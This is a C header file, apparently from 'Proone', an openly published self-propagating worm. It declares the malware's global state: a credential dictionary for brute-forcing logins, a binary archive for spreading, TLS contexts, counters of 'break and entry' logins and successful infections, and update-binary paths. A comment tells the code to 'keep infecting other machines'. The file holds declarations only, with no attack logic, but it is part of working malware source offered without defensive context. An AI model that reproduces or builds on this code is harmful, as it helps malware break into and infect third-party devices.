/*
* Copyright (c) 2019-2021 David Timber <mieabby@gmail.com>
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/
#pragma once
#include "pack.h"
#include "resolv.h"
#include "cred_dict.h"
#include "bitfield.h"

#include <stdint.h>
#include <stdbool.h>
#include <time.h>

#include <sys/types.h>

#include <mbedtls/ssl.h>
#include <mbedtls/entropy.h>
#include <mbedtls/ctr_drbg.h>


#define PROONE_BNE_MAX_CNT	128

struct prne_global { // TODO: tidy init code when finalised
	struct timespec parent_start;
	struct timespec child_start;
	uint8_t boot_id[16];
	uint8_t instance_id[16];
	pth_t main_pth;
	/*
	* Could be NULL. Just keep infecting other machines without it.
	*/
	prne_resolv_t *resolv;
	pid_t parent_pid;
	pid_t child_pid;
	int blackhole[2];
	int shm_fd;
	prne_rcb_param_t rcb_param;
	prne_bin_host_t bin_host;
	uint8_t *m_dvault;
	bool is_child;
	bool has_ba;
	uint8_t flags[prne_bf_get_size(NB_PRNE_IFLAG)];

	prne_bin_archive_t bin_archive;
	prne_cred_dict_t cred_dict;

	struct {
		mbedtls_x509_crt ca;
		mbedtls_entropy_context entpy;
		mbedtls_ctr_drbg_context rnd;
	} ssl;
	struct {
		bool ready;
		mbedtls_ssl_config conf;
		mbedtls_x509_crt crt;
		mbedtls_pk_context pk;
		mbedtls_dhm_context dhm;
	} s_ssl;
	struct {
		bool ready;
		mbedtls_ssl_config conf;
		mbedtls_x509_crt crt;
		mbedtls_pk_context pk;
	} c_ssl;
};

struct prne_shared_global {
	// Format Revision
	uint8_t rev;
	// Number of child process crash.
	uint32_t crash_cnt;
	// "break and entry" count. Number of successful logins.
	uint64_t bne_cnt;
	// Number of successful infections.
	uint64_t infect_cnt;
	// null-terminated path to the new binary image
	char upbin_path[256];
	char upbin_args[1024];
	size_t host_cred_len;
	uint8_t host_cred_data[255];
	uint8_t instance_id[16];
	uint8_t org_id[16];
};


extern struct prne_global prne_g;
// could be NULL on some environments
extern struct prne_shared_global *prne_s_g;
